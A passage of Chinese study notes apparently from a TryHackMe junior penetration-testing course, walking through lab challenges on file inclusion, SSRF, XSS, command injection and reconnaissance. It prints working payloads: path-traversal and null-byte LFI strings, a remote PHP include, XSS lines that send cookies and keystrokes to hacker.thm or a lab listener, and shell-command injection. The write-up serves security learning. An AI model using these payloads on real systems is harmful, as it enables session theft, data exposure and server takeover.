<p>除了限制文件包含的路径外，继续学习文件包含中过滤器fliter的应用。我们看向lab3，当我们输入<code>/etc/passwd</code>时出现报错，仔细观察包含的文件变成<code>/etc/passwd.php</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911214841539.png"></p>
<p>这其实是一种常见的手段，就是我们只能传文件名，然后与<code>.php</code>进行拼接去包含</p>
<p>这里我们可以利用<code>%00</code>来进行截断攻击，变成如下结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;language/../../../../../etc/passwd%00&quot;.&quot;.php&quot;) =&gt; include(&quot;language/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：不过这种攻击方式php版本必须低于5.3.4</p>
</blockquote>
<p>通过get传入payload，成功绕过</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220226967.png"></p>
<p>除了将文件名拼接，filter过滤器还可以对敏感文件的关键字进行过滤比如<code>/etc/passwd</code>。我们可以利用<code>.</code>表示当前目录的特性去绕过</p>
<p>（当然<code>%00</code>也可以绕过关键字过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd/.</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220031648.png"></p>
<p>还有最常见的过滤方式就是过滤<code>../</code>，防止我们进行路径遍历，当然这种替换方式很好绕过，使用双写绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....//....//....//etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220724481.png"></p>
<h4 id="Task3-远程文件包含-RFI"><a href="#Task3-远程文件包含-RFI" class="headerlink" title="Task3 远程文件包含 - RFI"></a>Task3 远程文件包含 - RFI</h4><blockquote>
<p>远程文件包含 (RFI) 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 是在不正确地清理用户输入时发生的，从而允许攻击者将外部 URL 注入包含函数中。 RFI 的一项要求是需要打开allow_url_fopen选项。</p>
</blockquote>
<p>RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 ( RCE )。成功的RFI攻击的其他后果包括：</p>
<ul>
<li>敏感信息披露</li>
<li>跨站脚本（ XSS ）</li>
<li>拒绝服务 ( DoS )</li>
</ul>
<p>我们在服务器上创建恶意php文件，然后开启http服务后远程包含我们的文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.27.18/playground.php?file=http://10.10.221.23:1028/Fhello.php</span><br></pre></td></tr></table></figure>





<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911221928381.png"></p>
<h4 id="Task4-修复措施"><a href="#Task4-修复措施" class="headerlink" title="Task4 修复措施"></a>Task4 修复措施</h4><p>作为开发人员，了解 Web 应用程序漏洞、如何查找它们以及预防方法非常重要。为了防止文件包含漏洞，一些常见的建议包括：</p>
<ol>
<li>保持系统和服务（包括 Web 应用程序框架）更新为最新版本。</li>
<li>关闭PHP错误以避免泄漏应用程序的路径和其他可能泄露的信息。</li>
<li>Web 应用程序防火墙(WAF) 是帮助减轻 Web 应用程序攻击的不错选择。</li>
<li>如果您的 Web 应用程序不需要某些会导致文件包含漏洞的 PHP 功能，请禁用<code>allow_url_fopen</code>和<code>allow_url_include</code>。</li>
<li>仔细分析 Web 应用程序，仅允许需要的协议和PHP包装器。</li>
<li>永远不要相信用户输入，并确保针对文件包含实施正确的输入验证。</li>
<li>实施文件名和位置白名单以及黑名单。</li>
</ol>
<h4 id="Task5-测试挑战"><a href="#Task5-测试挑战" class="headerlink" title="Task5 测试挑战"></a>Task5 测试挑战</h4><h5 id="挑战1"><a href="#挑战1" class="headerlink" title="挑战1"></a>挑战1</h5><p>尝试输入<code>/etc/passwd</code>，出现提示为POST传参。那么我们bp抓包修改请求方式为POST即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911223115674.png"></p>
<h5 id="挑战2"><a href="#挑战2" class="headerlink" title="挑战2"></a>挑战2</h5><p>提示需要admin才能看到界面，直接抓包修改cookie参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: THM=admin</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911223427776.png"></p>
<p>这里捣鼓了半天，原来注入点就是Cookie的THM参数，这里测试下发现限制目录和与<code>.php</code>进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../etc/flag2%00</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911224947450.png"></p>
<h5 id="挑战3"><a href="#挑战3" class="headerlink" title="挑战3"></a>挑战3</h5><p>尝试输入<code>../../../etc/passwd</code>，出现报错</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911225142124.png"></p>
<p>将查询文件与<code>.php</code>进行拼接，还有过滤了<code>.</code>和<code>/</code></p>
<p>提示说是该页面使用<code>$_REQUESTS</code>来接受 HTTP 请求，那么我们burpsuite抓包修改下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /challenges/chall3.php?file=../../../../../etc/flag3%00 HTTP/1.1</span><br><span class="line">Host: 10.10.27.18</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.27.18/challenges/chall3.php</span><br><span class="line">Cookie: THM=../../../../../etc/flag2%00</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">file=../../../../../etc/flag3%00</span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911225717087.png"></p>
<h5 id="挑战4"><a href="#挑战4" class="headerlink" title="挑战4"></a>挑战4</h5><p>和前面远程文件包含一样，不过就是把恶意php文件内容改一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;hostname&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911230218033.png"></p>
<h3 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF 服务器端请求伪造"></a>SSRF 服务器端请求伪造</h3><h4 id="Task1-SSRF示例"><a href="#Task1-SSRF示例" class="headerlink" title="Task1 SSRF示例"></a>Task1 SSRF示例</h4><p>预期请求是 website.thm 服务器期望接收的内容，红色部分是网站将获取信息的 URL。而攻击者可以将红色区域修改为他们所利用的URL</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912123408584.png"></p>
<p>攻击者可以目录遍历来控制路径，比如url传入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://website.thm/stock?url=/../user</span><br></pre></td></tr></table></figure>

<p>那么应用程序在处理的时候就会变成对<code>http://website.thm/stock/../user</code>发起请求</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912123833180.png"></p>
<p>有这么一种情况，就是攻击者可以控制向其发出请求的服务器的子域。正常情况下我们只能通过server参数传入子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://website.thm/stock?server=api&amp;id=1 =&gt; http://api.website.thm/stock?id=1</span><br></pre></td></tr></table></figure>

<p>很明显限制了我们访问敏感路径，不过我们可以利用<code>&amp;x=</code>结尾来绕过，作用是阻止将剩余路径附加到攻击者 URL 的末尾，并将其转换为查询字符串上的参数 <code>?x=</code>，我们修改下server参数的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://website.thm/stock?server=api.website.thm/api/user?id=1&amp;x=</span><br></pre></td></tr></table></figure>

<p>这样子在进行处理的时候就成功访问敏感路径了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://api.website.thm/api/user?id=1&amp;x=.website.thm/stock?server=api.website.thm/api/user?id=1</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125231856.png"></p>
<p>还有一种情况，就是我们可以将请求发送到我们的服务器上，这样可以捕获发送到攻击者指定域的HTTP请求头，这可能包含身份验证凭据或者API密钥</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125044786.png"></p>
<h4 id="Task2-SSRF常见位置"><a href="#Task2-SSRF常见位置" class="headerlink" title="Task2 SSRF常见位置"></a>Task2 SSRF常见位置</h4><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125346738.png"></p>
<h4 id="Task3-SSRF防护"><a href="#Task3-SSRF防护" class="headerlink" title="Task3 SSRF防护"></a>Task3 SSRF防护</h4><p><strong>黑名单</strong></p>
<p>拒绝列表是除了列表中指定的资源或匹配特定模式的资源之外的所有请求都被接受的地方。 Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域免遭公众访问，同时仍允许访问其他位置。限制访问的特定端点是  localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1  等域名将出现在拒绝列表中。攻击者可以使用替代本地主机引用（例如  <code>0、0.0.0.0、0000、127.1、127.*.*.*、2130706433、017700000001</code>）或具有解析为 IP 地址  127.0.0.1 的DNS记录的子域来绕过拒绝列表例如 127.0.0.1.nip.io。</p>
<p>此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上使用指向 IP 地址 169.254.169.254 的DNS记录注册子域来绕过此漏洞。</p>
<p><strong>白名单</strong></p>
<p>白名单是所有请求都被拒绝的地方，除非它们出现在列表中或匹配特定模式，例如参数中使用的 URL 必须以 <code>https://website.thm</code> 开头的规则。攻击者可以通过在攻击者的域名上创建子域（例如  <code>https://website.thm.attackers-domain.thm</code>）来快速规避此规则。应用程序逻辑现在将允许此输入并让攻击者控制内部 HTTP 请求。</p>
<p><strong>打开重定向</strong></p>
<p>如果上述绕过方法不起作用，那么攻击者还有另外一种伎俩，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 <code>https://website.thm/link?url=https://tryhackme.com</code> 为例。创建此端点是为了记录访问者出于广告&#x2F;营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，具有严格的规则，只允许以 <code>https://website.thm/</code> 开头的 URL。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。</p>
<h4 id="Task4-SSRF实战"><a href="#Task4-SSRF实战" class="headerlink" title="Task4 SSRF实战"></a>Task4 SSRF实战</h4><p>打开靶机，提供了两个新路径<code>/private</code>和<code>/customers/new-account-page</code></p>
<p>当我们访问<code>/private</code>时发现IP不被允许</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912130802826.png"></p>
<p>先创建个用户然后登录访问<code>/customers/new-account-page</code>，当我们点击图片属性时，发现图片来源于<code>/assets/avatars/1.png</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912131206043.png"></p>
<p>并且下面当表单提交时， <code>value</code> 属性会被发送到服务器，我们尝试修改为刚刚不被允许访问的<code>/private</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912132409090.png"></p>
<p>更新头像，不过好像不能是以private开头</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912132437445.png"></p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;radio&quot; name=&quot;avatar&quot; value=&quot;assets/../private&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>更新好后，把当前头像base64解码得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912133349865.png"></p>
<h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h3><h4 id="Task1-XSS-payload"><a href="#Task1-XSS-payload" class="headerlink" title="Task1 XSS payload"></a>Task1 XSS payload</h4><p>最基础的弹出一个带有文本字符串的警告框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>会话窃取</strong></p>
<p>可以获取目标的 cookie，对 cookie 进行 base64 编码以确保成功传输</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;https://hacker.thm/steal?cookie=&#x27; + btoa(document.cookie));&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>按键记录器</strong></p>
<p>下面的代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.onkeypress = function(e) &#123; fetch(&#x27;https://hacker.thm/log?key=&#x27; + btoa(e.key) );&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>业务逻辑</strong></p>
<p>假设有一个用于更改用户电子邮件地址的 JavaScript 函数，名为<code>user.changeEmail()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;user.changeEmail(&#x27;attacker@hacker.thm&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>现在帐户的电子邮件地址已更改，攻击者可能会执行重置密码攻击。</p>
<h4 id="Task2-反射型XSS"><a href="#Task2-反射型XSS" class="headerlink" title="Task2 反射型XSS"></a>Task2 反射型XSS</h4><blockquote>
<p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型 XSS。</p>
</blockquote>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913092903568.png"></p>
<h4 id="Task3-存储型XSS"><a href="#Task3-存储型XSS" class="headerlink" title="Task3 存储型XSS"></a>Task3 存储型XSS</h4><blockquote>
<p>顾名思义， XSS有效负载存储在 Web 应用程序中（例如数据库中），然后在其他用户访问该网站或网页时运行。</p>
</blockquote>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913092957145.png"></p>
<h4 id="Task4-基于DOM的XSS"><a href="#Task4-基于DOM的XSS" class="headerlink" title="Task4 基于DOM的XSS"></a>Task4 基于DOM的XSS</h4><p><strong>什么是 DOM？</strong></p>
<p>DOM 代表文档对象模型，是 HTML 和XML文档的编程接口。它代表页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档可以显示在浏览器窗口中，也可以作为 HTML 源代码显示。 HTML DOM 的图表如下所示：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913093257784.png"> <strong>利用 DOM</strong></p>
<p>DOM 基于XSS是指 JavaScript 直接在浏览器中执行，无需加载任何新页面或将数据提交给后端代码。当网站 JavaScript 代码作用于输入或 用户交互。</p>
<p><strong>示例场景：</strong></p>
<p>网站的 JavaScript 从<code>window.location.hash</code>获取内容 参数，然后将其写入当前正在使用的页面上 已查看部分。不会检查哈希内容是否存在恶意 代码，允许攻击者将他们选择的 JavaScript 注入到 网页。</p>
<p><strong>潜在影响：</strong></p>
<p>精心制作的链接 可以发送给潜在的受害者，将他们重定向到另一个网站 或从页面或用户会话中窃取内容。</p>
<p><strong>如何测试基于 Dom 的XSS ：</strong></p>
<p>基于 DOM 的 XSS 测试可能具有挑战性，并且需要一定的 JavaScript 知识才能阅读源代码。您需要查找访问攻击者可以控制的某些变量的代码部分，例如“ <strong>window.location.x</strong> ”参数。</p>
<p>当您找到这些代码时，您需要查看它们是如何处理的，以及这些值是否被写入网页的 DOM 或传递给不安全的 JavaScript 方法，例如<strong>eval()</strong> 。</p>
<h4 id="Task5-XSS盲注"><a href="#Task5-XSS盲注" class="headerlink" title="Task5 XSS盲注"></a>Task5 XSS盲注</h4><p>使用XSS Hunter Express工具会自动捕获 cookie、URL、页面内容等</p>
<p>工具地址：<code>https://github.com/mandatoryprogrammer/xsshunter-express</code></p>
<h4 id="Task6-完善payload"><a href="#Task6-完善payload" class="headerlink" title="Task6 完善payload"></a>Task6 完善payload</h4><h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094223521.png"></p>
<h5 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h5><p>我们继续用上面payload测试，发现失败。查看源码原来是我们的被嵌入到value元素了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094334820.png"></p>
<p>修改下payload，把前面的input标签闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094541684.png"></p>
<h5 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h5><p>拿最普通payload测试，出现了<code>&lt;textarea&gt;</code>标签</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094721757.png"></p>
<blockquote>
<p><code>&lt;textarea&gt;</code> 标签在HTML中用于创建一个可以让用户输入多行文本的输入控件，通常用于表单中的留言、评论或较长文本的输入。与 <code>&lt;input type=&quot;text&quot;&gt;</code> 类似，但它可以容纳更多的文本，并且文本区域的大小可以调整（虽然默认情况下是固定的，可以通过CSS来改变）。</p>
</blockquote>
<p>我们闭合前面即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913094850215.png"></p>
<h5 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h5><p>测试发现失败，查看源码注意到下面代码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095227120.png"></p>
<p>我们修改下payload，把前后的单引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;alert(&#x27;THM&#x27;);&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095344657.png"></p>
<h5 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h5><p>输入正常payload，发现关键字被过滤了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095443765.png"></p>
<p>修改payload，大小写绕过下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;alert(&#x27;THM&#x27;)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913095543224.png"></p>
<h5 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h5><p>只能输入图片的路径，前后闭合下双引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/images/1.jpg&quot; onerror=&quot;alert(&#x27;THM&#x27;);  #也可以/images/cat.jpg&quot; onload=&quot;alert(&#x27;THM&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913100019577.png"></p>
<h4 id="Task7-实战"><a href="#Task7-实战" class="headerlink" title="Task7 实战"></a>Task7 实战</h4><p>打开靶机，创建好用户后点击Support Tickets，创建个票据来测试是否存在XSS漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913101657639.png"></p>
<p>发现又是<code>&lt;textarea&gt;</code>标签，我们重新创建一个票据，把前面payload复制到内容处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>成功测试出XSS漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913101937482.png"></p>
<p>我们在服务器开启监听来窃取其他访问我们票据的用户cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;fetch(&#x27;http://10.10.110.189:777/?cookie=&#x27;+btoa(document.cookie));&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913102409586.png"></p>
<p>成功窃取其他用户的cookie，base64解码一下即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913102457236.png"></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>打开靶机，发现是一个测试设备IP的</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145602217.png"></p>
<p>使用<code>;</code>添加执行的命令，查看当前用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145733963.png"></p>
<p>cat命令查看flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat /home/tryhackme/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913145717026.png"></p>
<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="被动识别"><a href="#被动识别" class="headerlink" title="被动识别"></a>被动识别</h3><h4 id="Task1-whois"><a href="#Task1-whois" class="headerlink" title="Task1 whois"></a>Task1 whois</h4><p>使用在线网站查询域名</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913153238106.png"></p>
<h4 id="Task2-nslookup"><a href="#Task2-nslookup" class="headerlink" title="Task2 nslookup"></a>Task2 nslookup</h4><p>使用 nslookup 查找域名的 IP 地址，参数如下</p>
<table>
<thead>
<tr>
<th>查询类型</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>IPv4 地址</td>
</tr>
<tr>
<td>AAAA</td>
<td>IPv6 地址</td>
</tr>
<tr>
<td>CNAME</td>
<td>规范名称</td>
</tr>
<tr>
<td>MX</td>
<td>邮件服务器</td>
</tr>
<tr>
<td>SOA</td>
<td>授权开始</td>
</tr>
<tr>
<td>TXT</td>
<td>TXT 记录</td>
</tr>
</tbody></table>
<p>发出命令 <code>nslookup DOMAIN_NAME</code>，例如 <code>nslookup tryhackme.com</code>。或者可以使用 <code>nslookup OPTIONS DOMAIN_NAME SERVER</code> 。这三个主要参数是：</p>
<ul>
<li>OPTIONS 包含下表所示的查询类型。例如，您可以将 <code>A</code> 用于 IPv4 地址，将 <code>AAAA</code> 用于 IPv6 地址。</li>
<li>DOMAIN_NAME 是您要查找的域名。</li>
<li>SERVER 是要查询的 DNS 服务器。您可以选择任何本地或公有 DNS 服务器进行查询。Cloudflare 提供 <code>1.1.1.1</code> 和 <code>1.0.0.1，Google</code> 提供 <code>8.8.8.8</code> 和 <code>8.8.4.4，Quad9</code> 提供 <code>9.9.9.9</code> 和 <code>149.112.112.112。</code></li>
</ul>
<table>
<thead>
<tr>
<th>目的</th>
<th>命令行示例</th>
</tr>
</thead>
<tbody><tr>
<td>查找 DNS A 记录</td>
<td><code>nslookup -type=A tryhackme.com</code></td>
</tr>
<tr>
<td>在 DNS 服务器上查找 DNS MX 记录</td>
<td><code>nslookup -type=MX tryhackme.com 1.1.1.1</code></td>
</tr>
<tr>
<td>查找 DNS TXT 记录</td>
<td><code>nslookup -type=TXT tryhackme.com</code></td>
</tr>
</tbody></table>
<h4 id="Task3-DNSDumpster"><a href="#Task3-DNSDumpster" class="headerlink" title="Task3 DNSDumpster"></a>Task3 DNSDumpster</h4><p>可以使用为 DNS 查询提供详细答案的在线服务，例如 <a href="https://dnsdumpster.com/">DNSDumpster</a>。如果我们在 DNSDumpster 中搜索 <code>tryhackme.com</code>，我们会发现子域 <code>blog.tryhackme.com</code>，这是典型的 DNS 查询无法提供的。此外，DNSDumpster 会将收集到的 DNS 信息以易于阅读的表格和图表形式返回。DNSDumpster 还将提供有关侦听服务器的任何收集信息。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913154706795.png"></p>
<h4 id="Task4-Shodan-io"><a href="#Task4-Shodan-io" class="headerlink" title="Task4 Shodan.io"></a>Task4 Shodan.io</h4><p>此记录显示 Web 服务器;但是，如前所述，Shodan.io 会收集与它可以在网上找到的任何连接设备相关的信息。在 Shodan.io 上搜索 <code>tryhackme.com</code> 将至少显示上面屏幕截图中显示的记录。通过这个 Shodan.io 搜索结果，我们可以了解与我们的搜索相关的几件事，例如：</p>
<ul>
<li>IP地址</li>
<li>托管公司</li>
<li>地理位置</li>
<li>服务器类型和版本</li>
</ul>
<h3 id="主动侦察"><a href="#主动侦察" class="headerlink" title="主动侦察"></a>主动侦察</h3><h4 id="Task1-浏览器"><a href="#Task1-浏览器" class="headerlink" title="Task1 浏览器"></a>Task1 浏览器</h4><p>可以利用web开发者工具或者Wappalyzer插件去信息搜集</p>
<h4 id="Task2-ping"><a href="#Task2-ping" class="headerlink" title="Task2 ping"></a>Task2 ping</h4><blockquote>
<p>确保目标系统在线</p>
</blockquote>
<p>一般来说，当我们没有收到 ping 回复时，有一些解释可以解释为什么我们没有收到 ping 回复，例如：</p>
<ul>
<li>目标计算机没有响应;可能仍在启动或关闭，或者操作系统已崩溃。</li>
<li>它已从网络中拔下，或者路径上有故障的网络设备。</li>
<li>防火墙配置为阻止此类数据包。防火墙可能是在系统本身上运行的软件，也可能是单独的网络设备。请注意，MS Windows 防火墙默认阻止 ping。</li>
<li>您的系统已从网络中拔下。</li>
</ul>
<h4 id="Task3-路由跟踪"><a href="#Task3-路由跟踪" class="headerlink" title="Task3 路由跟踪"></a>Task3 路由跟踪</h4><blockquote>
<p>顾名思义，traceroute 命令跟踪数据包从系统到另一台主机的<em>路由</em>。traceroute 的目的是查找数据包在从系统传输到目标主机时经过的路由器或跃点的 IP  地址。此命令还显示两个系统之间的路由器数量。它非常有用，因为它指示系统和目标主机之间的跃点（路由器）数。但是，请注意，数据包采用的路由可能会发生变化，因为许多路由器使用适应网络变化的动态路由协议。</p>
</blockquote>
<p>尝试发现从系统到目标系统的路径上的路由器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">traceroute 10.10.10.1</span><br></pre></td></tr></table></figure>

<h4 id="Task4-telnet"><a href="#Task4-telnet" class="headerlink" title="Task4 telnet"></a>Task4 telnet</h4><p>使用 <code>telnet 10.10.110.51 PORT</code>，您可以连接到在 TCP 上运行的任何服务，甚至可以交换一些消息，除非它使用加密。我们可以添加上一些内容获得有效的响应，添加好后按两下回车即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">host: telnet   #随便写一个</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913164204747.png"></p>
<h3 id="nmap探测存活主机"><a href="#nmap探测存活主机" class="headerlink" title="nmap探测存活主机"></a>nmap探测存活主机</h3><h4 id="Task1-子网"><a href="#Task1-子网" class="headerlink" title="Task1 子网"></a>Task1 子网</h4><blockquote>
<p>在继续执行主要任务之前，让我们回顾一下几个术语。<em>网段</em>是使用共享介质连接的一组计算机。例如，介质可以是以太网交换机或 WiFi 接入点。在 IP 网络中，<em>子网</em>通常相当于一个或多个网络连接在一起并配置为使用同一路由器的网段。网段是指物理连接，而子网是指逻辑连接。</p>
</blockquote>
<p>在下面的网络图中，我们有四个网段或子网。一般来说，您的系统将连接到这些网段&#x2F;子网之一。子网（或简称子网）具有自己的 IP 地址范围，并通过路由器连接到更广泛的网络。根据每个网络，可能存在强制实施安全策略的防火墙。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913170558420.png"></p>
<p>上图显示了两种类型的子网：</p>
<ul>
